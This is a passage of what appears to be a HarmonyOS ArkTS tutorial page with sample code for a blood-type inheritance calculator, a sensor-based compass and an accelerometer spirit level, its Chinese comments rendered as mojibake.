=== &#x27;BO&#x27; || gene === &#x27;OB&#x27;) &#123; bloodTypes.push(&#x27;B&#x27;); // åŸºå› ç»„åˆä¸ºBBã€BOæˆ–OBæ—¶ï¼Œè¡€å‹ä¸ºB &#125; else if (gene === &#x27;AB&#x27; || gene === &#x27;BA&#x27;) &#123; bloodTypes.push(&#x27;AB&#x27;); // åŸºå› ç»„åˆä¸ºABæˆ–BAæ—¶ï¼Œè¡€å‹ä¸ºAB &#125; else if (gene === &#x27;OO&#x27;) &#123; bloodTypes.push(&#x27;O&#x27;); // åŸºå› ç»„åˆä¸ºOOæ—¶ï¼Œè¡€å‹ä¸ºO &#125; &#125; // å»é™¤é‡å¤çš„è¡€å‹ return bloodTypes.filter((value, index, self) =&gt; self.indexOf(value) === index); &#125; // è®¡ç®—å­©å­å¯èƒ½çš„è¡€å‹åŠä¸å¯èƒ½çš„è¡€å‹ calculatePossibleBloodTypes(father: string, mother: string) &#123; const fatherGenes = this.getGenes(father); // è·å–çˆ¶äº²çš„åŸºå› ç»„åˆ const motherGenes = this.getGenes(mother); // è·å–æ¯äº²çš„åŸºå› ç»„åˆ const possibleGenes = this.combineGenes(fatherGenes, motherGenes); // ç»„åˆçˆ¶æ¯çš„åŸºå›  const possibleBloodTypes = this.getBloodTypesFromGenes(possibleGenes); // ä»åŸºå› ç»„åˆä¸­è·å–å¯èƒ½çš„è¡€å‹ const allBloodTypes: string[] = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;AB&#x27;, &#x27;O&#x27;]; // æ‰€æœ‰å¯èƒ½çš„è¡€å‹åˆ—è¡¨ const impossibleBloodTypes = allBloodTypes.filter(bt =&gt; !possibleBloodTypes.includes(bt)); // è®¡ç®—ä¸å¯èƒ½çš„è¡€å‹ console.log(this.possibleBloodTypesText = `å­©å­å¯èƒ½è¡€å‹ï¼š$&#123;possibleBloodTypes.join(&#x27;ã€&#x27;)&#125;`); // æ˜¾ç¤ºå¯èƒ½çš„è¡€å‹ console.log(this.impossibleBloodTypesText = `å­©å­ä¸å¯èƒ½è¡€å‹ï¼š$&#123;impossibleBloodTypes.join(&#x27;ã€&#x27;)&#125;`); // æ˜¾ç¤ºä¸å¯èƒ½çš„è¡€å‹ &#125; // å½“èƒ¶å›ŠæŒ‰é’®çš„é€‰æ‹©å‘ç”Ÿå˜åŒ–æ—¶è°ƒç”¨æ­¤å‡½æ•° capsuleSelectedIndexesChanged() &#123; let father: string = this.bloodTypeList[this.fatherBloodTypeIndex[0]][&#x27;text&#x27;]; // è·å–çˆ¶äº²é€‰æ‹©çš„è¡€å‹ let mother: string = this.bloodTypeList[this.motherBloodTypeIndex[0]][&#x27;text&#x27;]; // è·å–æ¯äº²é€‰æ‹©çš„è¡€å‹ this.calculatePossibleBloodTypes(father, mother); // è®¡ç®—å¹¶æ›´æ–°è¡€å‹ä¿¡æ¯ &#125; // åœ¨ç»„ä»¶å³å°†å‡ºç°æ—¶è°ƒç”¨æ­¤å‡½æ•° aboutToAppear(): void &#123; this.singleSelectCapsuleOptions = SegmentButtonOptions.capsule(&#123; buttons: this.bloodTypeList as SegmentButtonItemTuple, // è®¾ç½®èƒ¶å›ŠæŒ‰é’®çš„é€‰é¡¹ multiply: false, // å•é€‰æ¨¡å¼ fontColor: Color.White, // å­—ä½“é¢œè‰²ä¸ºç™½è‰² selectedFontColor: Color.White, // é€‰ä¸­æ—¶å­—ä½“é¢œè‰²ä¸ºç™½è‰² selectedBackgroundColor: this.themeColor, // é€‰ä¸­èƒŒæ™¯è‰²ä¸ºä¸»é¢˜è‰² backgroundColor: this.lineColor, // èƒŒæ™¯è‰²ä¸ºè¾¹æ¡†é¢œè‰² backgroundBlurStyle: BlurStyle.BACKGROUND_THICK // èƒŒæ™¯æ¨¡ç³Šæ•ˆæœ &#125;); this.capsuleSelectedIndexesChanged(); // åˆå§‹åŒ–æ—¶è°ƒç”¨é€‰æ‹©å˜åŒ–å¤„ç†å‡½æ•° &#125; // æ„å»ºç”¨æˆ·ç•Œé¢ build() &#123; Column() &#123; // é¡µé¢æ ‡é¢˜ Text(&#x27;è¡€å‹é—ä¼ è®¡ç®—&#x27;) .fontColor(this.textColor) // æ–‡æœ¬é¢œè‰² .fontSize(18) // å­—ä½“å¤§å° .width(&#x27;100%&#x27;) // å®½åº¦ä¸º100% .height(50) // é«˜åº¦ä¸º50 .textAlign(TextAlign.Center) // æ–‡æœ¬å±…ä¸­å¯¹é½ .backgroundColor(Color.White) // èƒŒæ™¯è‰²ä¸ºç™½è‰² .shadow(&#123; // æ·»åŠ é˜´å½±æ•ˆæœ radius: 2, // é˜´å½±åŠå¾„ color: this.lineColor, // é˜´å½±é¢œè‰² offsetX: 0, // æ°´å¹³åç§»é‡ offsetY: 5 // å‚ç›´åç§»é‡ &#125;); // å·¥å…·ä»‹ç»éƒ¨åˆ† Column() &#123; Text(&#x27;å·¥å…·ä»‹ç»&#x27;).fontSize(20).fontWeight(600).fontColor(this.textColor); Text(&#x27;è¡€å‹æ˜¯ä»¥Aã€Bã€Oä¸‰ç§é—ä¼ å› å­çš„ç»„åˆè€Œå†³å®šçš„ï¼Œæ ¹æ®çˆ¶æ¯çš„è¡€å‹ï¼Œå°±å¯ä»¥åˆ¤æ–­å‡ºä»¥åå‡ºç”Ÿçš„å­©å­çš„è¡€å‹ã€‚&#x27;) .fontSize(18).fontColor(this.textColor).margin(&#123; top: `$&#123;this.basePadding / 2&#125;lpx` &#125;); &#125; .alignItems(HorizontalAlign.Start) .width(&#x27;650lpx&#x27;) .padding(`$&#123;this.basePadding&#125;lpx`) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .borderRadius(10) .backgroundColor(Color.White) .shadow(&#123; radius: 10, color: this.lineColor, offsetX: 0, offsetY: 0 &#125;); // çˆ¶äº²è¡€å‹é€‰æ‹©éƒ¨åˆ† Column() &#123; Row() &#123; Text(&#x27;çˆ¶äº²è¡€å‹&#x27;).fontColor(this.textColor).fontSize(18); SegmentButton(&#123; options: this.singleSelectCapsuleOptions, // èƒ¶å›ŠæŒ‰é’®çš„é…ç½®é¡¹ selectedIndexes: this.fatherBloodTypeIndex // å½“å‰é€‰ä¸­çš„ç´¢å¼• &#125;).width(&#x27;400lpx&#x27;); &#125;.height(45).justifyContent(FlexAlign.SpaceBetween).width(&#x27;100%&#x27;); // æ¯äº²è¡€å‹é€‰æ‹©éƒ¨åˆ† Row() &#123; Text(&#x27;æ¯äº²è¡€å‹&#x27;).fontColor(this.textColor).fontSize(18); SegmentButton(&#123; options: this.singleSelectCapsuleOptions, // èƒ¶å›ŠæŒ‰é’®çš„é…ç½®é¡¹ selectedIndexes: this.motherBloodTypeIndex // å½“å‰é€‰ä¸­çš„ç´¢å¼• &#125;).width(&#x27;400lpx&#x27;); &#125;.height(45).justifyContent(FlexAlign.SpaceBetween).width(&#x27;100%&#x27;); &#125; .alignItems(HorizontalAlign.Start) .width(&#x27;650lpx&#x27;) .padding(`$&#123;this.basePadding&#125;lpx`) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .borderRadius(10) .backgroundColor(Color.White) .shadow(&#123; radius: 10, color: this.lineColor, offsetX: 0, offsetY: 0 &#125;); // æ˜¾ç¤ºè®¡ç®—ç»“æœ Column() &#123; Row() &#123; Text(this.possibleBloodTypesText).fontColor(this.textColor).fontSize(18); &#125;.height(45).justifyContent(FlexAlign.SpaceBetween).width(&#x27;100%&#x27;); Row() &#123; Text(this.impossibleBloodTypesText).fontColor(this.textColor).fontSize(18); &#125;.height(45).justifyContent(FlexAlign.SpaceBetween).width(&#x27;100%&#x27;); &#125; .alignItems(HorizontalAlign.Start) .width(&#x27;650lpx&#x27;) .padding(`$&#123;this.basePadding&#125;lpx`) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .borderRadius(10) .backgroundColor(Color.White) .shadow(&#123; radius: 10, color: this.lineColor, offsetX: 0, offsetY: 0 &#125;); &#125; .height(&#x27;100%&#x27;) .width(&#x27;100%&#x27;) .backgroundColor(&quot;#f4f8fb&quot;); // é¡µé¢èƒŒæ™¯è‰² &#125;&#125; compassæŒ‡å—é’ˆ ä¼ æ„Ÿå™¨ è§’åº¦è®¡ç®— 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175import &#123; sensor &#125; from &#x27;@kit.SensorServiceKit&#x27;; // å¯¼å…¥ä¼ æ„Ÿå™¨æœåŠ¡æ¨¡å—import &#123; BusinessError &#125; from &#x27;@kit.BasicServicesKit&#x27;; // å¯¼å…¥ä¸šåŠ¡é”™è¯¯å¤„ç†æ¨¡å— // å®šä¹‰æ–¹å‘èŒƒå›´ç±»class DirectionRange &#123; name: string = &#x27;&#x27;; // æ–¹å‘åç§° min: number = 0; // æœ€å°è§’åº¦ max: number = 0; // æœ€å¤§è§’åº¦&#125; // å®šä¹‰å„ä¸ªæ–¹å‘çš„èŒƒå›´const DIRECTION_RANGES: DirectionRange[] = [ &#123; name: &#x27;åŒ—&#x27;, min: 337.5, max: 360 &#125;, &#123; name: &#x27;åŒ—&#x27;, min: 0, max: 22.5 &#125;, &#123; name: &#x27;ä¸œåŒ—&#x27;, min: 22.5, max: 67.5 &#125;, &#123; name: &#x27;ä¸œ&#x27;, min: 67.5, max: 112.5 &#125;, &#123; name: &#x27;ä¸œå—&#x27;, min: 112.5, max: 157.5 &#125;, &#123; name: &#x27;å—&#x27;, min: 157.5, max: 202.5 &#125;, &#123; name: &#x27;è¥¿å—&#x27;, min: 202.5, max: 247.5 &#125;, &#123; name: &#x27;è¥¿&#x27;, min: 247.5, max: 292.5 &#125;, &#123; name: &#x27;è¥¿åŒ—&#x27;, min: 292.5, max: 337.5 &#125;]; // å®šä¹‰æŒ‡å—é’ˆç»„ä»¶@Entry@Componentstruct Compass &#123; @State directionMessage: string = &#x27;&#x27;; // å½“å‰æ–¹å‘çš„åç§° @State rotationAngle: number = 0; // å½“å‰æ—‹è½¬è§’åº¦ @State currentAngle: number = 0; // å½“å‰ä¼ æ„Ÿå™¨è§’åº¦ @State cumulativeRotation: number = 0; // ç´¯è®¡æ—‹è½¬è§’åº¦ private threshold: number = 1; // è®¾ç½®é˜ˆå€¼ï¼Œç”¨äºè¿‡æ»¤å°çš„æ—‹è½¬å˜åŒ– // ç»„ä»¶å³å°†å‡ºç°æ—¶è°ƒç”¨ aboutToAppear(): void &#123; sensor.getSensorList((error: BusinessError) =&gt; &#123; if (error) &#123; console.error(&#x27;è·å–ä¼ æ„Ÿå™¨åˆ—è¡¨å¤±è´¥&#x27;, error); // å¦‚æœè·å–ä¼ æ„Ÿå™¨åˆ—è¡¨å¤±è´¥ï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯ return; &#125; this.startOrientationUpdates(); // å¼€å§‹ç›‘å¬ä¼ æ„Ÿå™¨æ•°æ® &#125;); &#125; // å¼€å§‹ç›‘å¬ä¼ æ„Ÿå™¨çš„æ–¹ä½æ•°æ® private startOrientationUpdates(): void &#123; sensor.on(sensor.SensorId.ORIENTATION, (orientationData) =&gt; &#123; const alpha = orientationData.alpha; // è·å–å½“å‰çš„æ–¹ä½è§’ this.directionMessage = this.calculateDirection(alpha); // è®¡ç®—å½“å‰æ–¹å‘ const angleDifference = this.calculateAngleDifference(this.currentAngle, alpha); // è®¡ç®—è§’åº¦å·® if (Math.abs(angleDifference) &gt; this.threshold) &#123; // å¦‚æœè§’åº¦å˜åŒ–è¶…è¿‡é˜ˆå€¼ this.updateRotationAngle(angleDifference, alpha); // æ›´æ–°æ—‹è½¬è§’åº¦ &#125; &#125;, &#123; interval: 10000000 &#125;); // è®¾ç½®ä¼ æ„Ÿå™¨æ›´æ–°é—´éš”ï¼Œå•ä½ä¸ºçº³ç§’ï¼Œ10000000è¡¨ç¤º1ç§’ &#125; // è®¡ç®—ä¸¤ä¸ªè§’åº¦ä¹‹é—´çš„å·®å¼‚ private calculateAngleDifference(currentAngle: number, targetAngle: number): number &#123; let diff = targetAngle - currentAngle; // è®¡ç®—è§’åº¦å·® if (diff &gt; 180) &#123; diff -= 360; // é¡ºæ—¶é’ˆæ—‹è½¬è¶…è¿‡180åº¦ï¼Œè°ƒæ•´ä¸ºè´Ÿå€¼ &#125; else if (diff &lt; -180) &#123; diff += 360; // é€†æ—¶é’ˆæ—‹è½¬è¶…è¿‡180åº¦ï¼Œè°ƒæ•´ä¸ºæ­£å€¼ &#125; return diff; // è¿”å›è°ƒæ•´åçš„è§’åº¦å·® &#125; // æ›´æ–°æ—‹è½¬è§’åº¦ private updateRotationAngle(angleDifference: number, newAngle: number): void &#123; this.cumulativeRotation += angleDifference; // ç´¯åŠ æ—‹è½¬è§’åº¦ this.rotationAngle += angleDifference; // æ›´æ–°å½“å‰æ—‹è½¬è§’åº¦ this.currentAngle = newAngle; // æ›´æ–°å½“å‰ä¼ æ„Ÿå™¨è§’åº¦ // åŠ¨ç”»æ›´æ–° animateToImmediately(&#123;&#125;, () =&gt; &#123; this.rotationAngle = this.cumulativeRotation; // å°†æ—‹è½¬è§’åº¦è®¾ç½®ä¸ºç´¯è®¡æ—‹è½¬è§’åº¦ &#125;); console.log(`ç´¯è®¡æ—‹è½¬è§’åº¦: $&#123;this.cumulativeRotation&#125;`); // æ‰“å°ç´¯è®¡æ—‹è½¬è§’åº¦ &#125; // æ ¹æ®è§’åº¦è®¡ç®—æ–¹å‘ private calculateDirection(angle: number): string &#123; for (const range of DIRECTION_RANGES) &#123; if (angle &gt;= range.min &amp;&amp; angle &lt; range.max) &#123; return range.name; // è¿”å›å¯¹åº”çš„æ–¹å‘åç§° &#125; &#125; return &#x27;æœªçŸ¥æ–¹å‘&#x27;; // å¦‚æœè§’åº¦ä¸åœ¨ä»»ä½•èŒƒå›´å†…ï¼Œè¿”å›æœªçŸ¥æ–¹å‘ &#125; // æ„å»ºç”¨æˆ·ç•Œé¢ build() &#123; Column(&#123; space: 20 &#125;) &#123; // åˆ›å»ºä¸€ä¸ªåˆ—å¸ƒå±€ï¼Œè®¾ç½®é—´è·ä¸º20 Row(&#123; space: 5 &#125;) &#123; // åˆ›å»ºä¸€ä¸ªè¡Œå¸ƒå±€ï¼Œè®¾ç½®é—´è·ä¸º5 Text(this.directionMessage) // æ˜¾ç¤ºå½“å‰æ–¹å‘ .layoutWeight(1) // è®¾ç½®å¸ƒå±€æƒé‡ .textAlign(TextAlign.End) // æ–‡æœ¬å¯¹é½æ–¹å¼ .fontColor(&#x27;#dedede&#x27;) // æ–‡æœ¬é¢œè‰² .fontSize(50); // æ–‡æœ¬å¤§å° Text(`$&#123;Math.floor(this.currentAngle)&#125;Â°`) // æ˜¾ç¤ºå½“å‰è§’åº¦ .layoutWeight(1) // è®¾ç½®å¸ƒå±€æƒé‡ .textAlign(TextAlign.Start) // æ–‡æœ¬å¯¹é½æ–¹å¼ .fontColor(&#x27;#dedede&#x27;) // æ–‡æœ¬é¢œè‰² .fontSize(50); // æ–‡æœ¬å¤§å° &#125;.width(&#x27;100%&#x27;).margin(&#123; top: 50 &#125;); // è®¾ç½®å®½åº¦å’Œä¸Šè¾¹è· Stack() &#123; // åˆ›å»ºä¸€ä¸ªå †å å¸ƒå±€ Stack() &#123; // å†…éƒ¨å †å å¸ƒå±€ Circle() // åˆ›å»ºä¸€ä¸ªåœ†å½¢ .width(250) // è®¾ç½®å®½åº¦ .height(250) // è®¾ç½®é«˜åº¦ .fillOpacity(0) // è®¾ç½®å¡«å……é€æ˜åº¦ .strokeWidth(25) // è®¾ç½®è¾¹æ¡†å®½åº¦ .stroke(&#x27;#f95941&#x27;) // è®¾ç½®è¾¹æ¡†é¢œè‰² .strokeDashArray([1, 5]) // è®¾ç½®è¾¹æ¡†è™šçº¿æ ·å¼ .strokeLineJoin(LineJoinStyle.Round); // è®¾ç½®è¾¹æ¡†è¿æ¥æ–¹å¼ Text(&#x27;åŒ—&#x27;) // åˆ›å»ºä¸€ä¸ªæ–‡æœ¬ï¼Œæ˜¾ç¤ºâ€œåŒ—â€ .height(&#x27;100%&#x27;) // è®¾ç½®é«˜åº¦ .width(40) // è®¾ç½®å®½åº¦ .align(Alignment.Top) // è®¾ç½®å¯¹é½æ–¹å¼ .fontColor(&#x27;#ff4f3f&#x27;) // è®¾ç½®æ–‡æœ¬é¢œè‰² .rotate(&#123; angle: 0 &#125;) // è®¾ç½®æ—‹è½¬è§’åº¦ .padding(&#123; top: 80 &#125;) // è®¾ç½®å†…è¾¹è· .textAlign(TextAlign.Center); // è®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼ Text(&#x27;ä¸œ&#x27;) // åˆ›å»ºä¸€ä¸ªæ–‡æœ¬ï¼Œæ˜¾ç¤ºâ€œä¸œâ€ .height(&#x27;100%&#x27;) // è®¾ç½®é«˜åº¦ .width(40) // è®¾ç½®å®½åº¦ .align(Alignment.Top) // è®¾ç½®å¯¹é½æ–¹å¼ .fontColor(&#x27;#fcfdfd&#x27;) // è®¾ç½®æ–‡æœ¬é¢œè‰² .rotate(&#123; angle: 90 &#125;) // è®¾ç½®æ—‹è½¬è§’åº¦ .padding(&#123; top: 80 &#125;) // è®¾ç½®å†…è¾¹è· .textAlign(TextAlign.Center); // è®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼ Text(&#x27;å—&#x27;) // åˆ›å»ºä¸€ä¸ªæ–‡æœ¬ï¼Œæ˜¾ç¤ºâ€œå—â€ .height(&#x27;100%&#x27;) // è®¾ç½®é«˜åº¦ .width(40) // è®¾ç½®å®½åº¦ .align(Alignment.Top) // è®¾ç½®å¯¹é½æ–¹å¼ .fontColor(&#x27;#fcfdfd&#x27;) // è®¾ç½®æ–‡æœ¬é¢œè‰² .rotate(&#123; angle: 180 &#125;) // è®¾ç½®æ—‹è½¬è§’åº¦ .padding(&#123; top: 80 &#125;) // è®¾ç½®å†…è¾¹è· .textAlign(TextAlign.Center); // è®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼ Text(&#x27;è¥¿&#x27;) // åˆ›å»ºä¸€ä¸ªæ–‡æœ¬ï¼Œæ˜¾ç¤ºâ€œè¥¿â€ .height(&#x27;100%&#x27;) // è®¾ç½®é«˜åº¦ .width(40) // è®¾ç½®å®½åº¦ .align(Alignment.Top) // è®¾ç½®å¯¹é½æ–¹å¼ .fontColor(&#x27;#fcfdfd&#x27;) // è®¾ç½®æ–‡æœ¬é¢œè‰² .rotate(&#123; angle: 270 &#125;) // è®¾ç½®æ—‹è½¬è§’åº¦ .padding(&#123; top: 80 &#125;) // è®¾ç½®å†…è¾¹è· .textAlign(TextAlign.Center); // è®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼ &#125; .width(&#x27;100%&#x27;) // è®¾ç½®å®½åº¦ .height(&#x27;100%&#x27;) // è®¾ç½®é«˜åº¦ .borderRadius(&#x27;50%&#x27;) // è®¾ç½®åœ†è§’ .margin(&#123; top: 50 &#125;) // è®¾ç½®ä¸Šè¾¹è· .rotate(&#123; angle: -this.rotationAngle &#125;) // è®¾ç½®æ—‹è½¬è§’åº¦ .animation(&#123;&#125;); // è®¾ç½®åŠ¨ç”»æ•ˆæœ Line() // åˆ›å»ºä¸€ä¸ªçº¿æ¡ .width(5) // è®¾ç½®å®½åº¦ .height(40) // è®¾ç½®é«˜åº¦ .backgroundColor(&#x27;#fdfffe&#x27;) // è®¾ç½®èƒŒæ™¯é¢œè‰² .borderRadius(&#x27;50%&#x27;) // è®¾ç½®åœ†è§’ .margin(&#123; bottom: 200 &#125;); // è®¾ç½®ä¸‹è¾¹è· &#125; .width(300) // è®¾ç½®å®½åº¦ .height(300); // è®¾ç½®é«˜åº¦ &#125; .height(&#x27;100%&#x27;) // è®¾ç½®é«˜åº¦ .width(&#x27;100%&#x27;) // è®¾ç½®å®½åº¦ .backgroundColor(&#x27;#18181a&#x27;); // è®¾ç½®èƒŒæ™¯é¢œè‰² &#125;&#125; levelæ°´å¹³ä»ª 123456789//module.json5&#123; &quot;module&quot;: &#123; &quot;requestPermissions&quot;: [ &#123; &quot;name&quot;: &quot;ohos.permission.ACCELEROMETER&quot; &#125; ],&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168// å¯¼å…¥ä¼ æ„Ÿå™¨æœåŠ¡æ¨¡å—import &#123; sensor &#125; from &#x27;@kit.SensorServiceKit&#x27;;// å¯¼å…¥ä¸šåŠ¡é”™è¯¯å¤„ç†æ¨¡å—import &#123; BusinessError &#125; from &#x27;@kit.BasicServicesKit&#x27;; // å®šä¹‰å•ä½é•¿åº¦ï¼Œç”¨äºåç»­è®¡ç®—ä¸­çš„æ¯”ä¾‹å°ºconst UNIT_LENGTH = 4; // ä½¿ç”¨ @Entry å’Œ @Component è£…é¥°å™¨å®šä¹‰ä¸€ä¸ªåä¸º LevelMeter çš„ç»„ä»¶@Entry@Componentstruct LevelMeter &#123; // å®šä¹‰çŠ¶æ€å˜é‡ï¼Œç”¨äºå­˜å‚¨å½“å‰è§’åº¦ @State angle: number = 0; // å®šä¹‰çŠ¶æ€å˜é‡ï¼Œç”¨äºå­˜å‚¨å‰åå€¾æ–œè§’åº¦ï¼ˆpitchï¼‰ @State pitch: number = 0; // å®šä¹‰çŠ¶æ€å˜é‡ï¼Œç”¨äºå­˜å‚¨å·¦å³å€¾æ–œè§’åº¦ï¼ˆrollï¼‰ @State roll: number = 0; // å®šä¹‰è§’åº¦å˜åŒ–é˜ˆå€¼ï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦éœ€è¦æ›´æ–°è§’åº¦ private threshold: number = 1; // ç»„ä»¶å³å°†å‡ºç°æ—¶çš„ç”Ÿå‘½å‘¨æœŸæ–¹æ³• aboutToAppear(): void &#123; // è·å–ä¼ æ„Ÿå™¨åˆ—è¡¨ sensor.getSensorList((error: BusinessError) =&gt; &#123; if (error) &#123; // å¦‚æœè·å–ä¼ æ„Ÿå™¨åˆ—è¡¨å¤±è´¥ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯ console.error(&#x27;è·å–ä¼ æ„Ÿå™¨åˆ—è¡¨å¤±è´¥&#x27;, error); return; &#125; // å¼€å§‹æ›´æ–°æ–¹å‘ä¿¡æ¯ this.startOrientationUpdates(); &#125;); &#125; // å¯åŠ¨æ–¹å‘æ›´æ–°çš„æ–¹æ³• private startOrientationUpdates(): void &#123; // æ³¨å†ŒåŠ é€Ÿåº¦ä¼ æ„Ÿå™¨äº‹ä»¶ç›‘å¬å™¨ sensor.on(sensor.SensorId.ACCELEROMETER, (data) =&gt; &#123; // è®¡ç®—æ–°çš„å‰åå€¾æ–œè§’åº¦ï¼ˆpitchï¼‰ const newPitch = Math.atan(data.y / Math.sqrt(data.x * data.x + data.z * data.z)) * (180 / Math.PI); // è®¡ç®—æ–°çš„å·¦å³å€¾æ–œè§’åº¦ï¼ˆrollï¼‰ const newRoll = Math.atan(data.x / Math.sqrt(data.y * data.y + data.z * data.z)) * (180 / Math.PI); // å¦‚æœæ–°çš„è§’åº¦å˜åŒ–è¶…è¿‡é˜ˆå€¼ï¼Œåˆ™æ›´æ–°çŠ¶æ€ if (Math.abs(newPitch - this.pitch) &gt; this.threshold || Math.abs(newRoll - this.roll) &gt; this.threshold) &#123; this.pitch = newPitch; this.roll = newRoll; // æ›´æ–°å½“å‰è§’åº¦ this.angle = Math.hypot(newPitch, newRoll); &#125; &#125;, &#123; interval: 100000000 &#125;); // è®¾ç½®æ›´æ–°é—´éš”ä¸º100æ¯«ç§’ &#125; // è®¡ç®—å°çƒä½ç½®çš„æ–¹æ³• private calculateBallPosition(): Position &#123; // æ ¹æ®å½“å‰è§’åº¦è®¡ç®—åŠå¾„ const radius = (this.angle &lt;= 10 ? this.angle * 2.5 : (10 * 2.5 + (this.angle - 10))) * UNIT_LENGTH; // å°†è§’åº¦è½¬æ¢ä¸ºå¼§åº¦ const angleInRadians = Math.atan2(this.pitch, this.roll); // è®¡ç®—å°çƒåœ¨åœ†å‘¨ä¸Šçš„Xåæ ‡ const x = -radius * Math.cos(angleInRadians); // è®¡ç®—å°çƒåœ¨åœ†å‘¨ä¸Šçš„Yåæ ‡ const y = radius * Math.sin(angleInRadians); // è¿”å›å°çƒçš„ä½ç½® return &#123; x, y &#125;; &#125; // æ„å»ºUIçš„æ–¹æ³• build() &#123; // ä½¿ç”¨Stackå¸ƒå±€å®¹å™¨ Stack() &#123; // æ˜¾ç¤ºå½“å‰è§’åº¦çš„æ–‡æœ¬ Stack() &#123; Row(&#123; space: 5 &#125;) &#123; // åˆ›å»ºä¸€ä¸ªè¡Œå¸ƒå±€ï¼Œè®¾ç½®é—´è·ä¸º5 Text(`$&#123;Math.floor(this.angle)&#125;Â°`)// æ˜¾ç¤ºå½“å‰è§’åº¦ .layoutWeight(1)// è®¾ç½®å¸ƒå±€æƒé‡ .textAlign(TextAlign.Center)// æ–‡æœ¬å¯¹é½æ–¹å¼ .fontColor(&#x27;#dedede&#x27;)// æ–‡æœ¬é¢œè‰² .fontSize(60); // æ–‡æœ¬å¤§å° &#125;.width(&#x27;100%&#x27;).margin(&#123; top: 80 &#125;) // è®¾ç½®å®½åº¦å’Œä¸Šè¾¹è· &#125;.height(&#x27;100%&#x27;).align(Alignment.Top) // è®¾ç½®é«˜åº¦å’Œå¯¹é½æ–¹å¼ // æ¨¡æ‹Ÿæ°´å¹³ä»ªèƒŒæ™¯çš„åœ†ç¯ Stack() &#123; // å¤–éƒ¨å¤§åœ† Text() .width(&#x27;600lpx&#x27;)// è®¾ç½®å®½åº¦ .height(&#x27;600lpx&#x27;)// è®¾ç½®é«˜åº¦ .borderRadius(&#x27;50%&#x27;)// è®¾ç½®åœ†è§’ .backgroundColor(&quot;#171b1e&quot;)// è®¾ç½®èƒŒæ™¯é¢œè‰² .blur(50)// è®¾ç½®æ¨¡ç³Šæ•ˆæœ .shadow(&#123; radius: 300, type: ShadowType.COLOR, color: &quot;#232426&quot; &#125;); // è®¾ç½®é˜´å½±æ•ˆæœ // ä¸­é—´åœ† Text() .width(`$&#123;(this.angle &lt;= 10 ? this.angle * 2.5 : (10 * 2.5 + (this.angle - 10))) * UNIT_LENGTH * 2&#125;lpx`)// è®¡ç®—å®½åº¦ .height(`$&#123;(this.angle &lt;= 10 ? this.angle * 2.5 : (10 * 2.5 + (this.angle - 10))) * UNIT_LENGTH * 2&#125;lpx`)// è®¡ç®—é«˜åº¦ .borderRadius(&#x27;50%&#x27;)// è®¾ç½®åœ†è§’ .backgroundColor(&quot;#2e3235&quot;)// è®¾ç½®èƒŒæ™¯é¢œè‰² .animation(&#123; curve: Curve.EaseOut &#125;); // è®¾ç½®åŠ¨ç”»æ•ˆæœ // åˆ»åº¦çº¿ ForEach([10, 20, 30, 40, 50], (item: number) =&gt; &#123; Text() .width(`$&#123;(15 + item) * UNIT_LENGTH * 2&#125;lpx`)// è®¡ç®—å®½åº¦ .height(`$&#123;(15 + item) * UNIT_LENGTH * 2&#125;lpx`)// è®¡ç®—é«˜åº¦ .borderWidth(1)// è®¾ç½®è¾¹æ¡†å®½åº¦ .borderRadius(&#x27;50%&#x27;)// è®¾ç½®åœ†è§’ .borderColor(&quot;#807d8184&quot;); // è®¾ç½®è¾¹æ¡†é¢œè‰² // åˆ»åº¦æ•°å­— Text(`$&#123;item&#125;`) .width(20)// è®¾ç½®å®½åº¦ .fontColor(&quot;#7d8184&quot;)// è®¾ç½®å­—ä½“é¢œè‰² .fontSize(10)// è®¾ç½®å­—ä½“å¤§å° .textAlign(TextAlign.Center)// è®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼ .margin(&#123; left: `$&#123;(15 + item) * UNIT_LENGTH * 2&#125;lpx` &#125;); // è®¾ç½®å·¦è¾¹è· &#125;); // å°çƒ Text() .width(14)// è®¾ç½®å®½åº¦ .height(14)// è®¾ç½®é«˜åº¦ .backgroundColor(&quot;#ff5841&quot;)// è®¾ç½®èƒŒæ™¯é¢œè‰² .borderRadius(&#x27;50%&#x27;); // è®¾ç½®åœ†è§’ // å°çƒèƒŒæ™¯ Stack() &#123; Stack() &#123; &#125; .radialGradient(&#123; center: [20, 20], // è®¾ç½®æ¸å˜ä¸­å¿ƒç‚¹ radius: 60, // è®¾ç½®æ¸å˜åŠå¾„ colors: [ [&quot;#807a7a83&quot;, 0.0], // æ¸å˜é¢œè‰²1 [&quot;#8074747e&quot;, 0.7], // æ¸å˜é¢œè‰²2 [&quot;#80898992&quot;, 1.0]// æ¸å˜é¢œè‰²3 ] &#125;).width(&#x27;100%&#x27;).height(&#x27;100%&#x27;) // è®¾ç½®å®½åº¦å’Œé«˜åº¦ &#125; .clip(true) // è®¾ç½®è£å‰ª .radialGradient(&#123; center: [20, 20], // è®¾ç½®æ¸å˜ä¸­å¿ƒç‚¹ radius: 60, // è®¾ç½®æ¸å˜åŠå¾„ colors: Math.floor(this.angle) === 0 ? [[&quot;#FF6B6B&quot;, 0.0], [&quot;#D84315&quot;, 0.3], [&quot;#C62828&quot;, 1.0]] : // å½“è§’åº¦ä¸º0æ—¶çš„æ¸å˜é¢œè‰² [[&quot;#bcbcc6&quot;, 0.0], [&quot;#464650&quot;, 0.3], [&quot;#474750&quot;, 1.0]] // å½“è§’åº¦ä¸ä¸º0æ—¶çš„æ¸å˜é¢œè‰² &#125;) .width(50) // è®¾ç½®å®½åº¦ .height(50) // 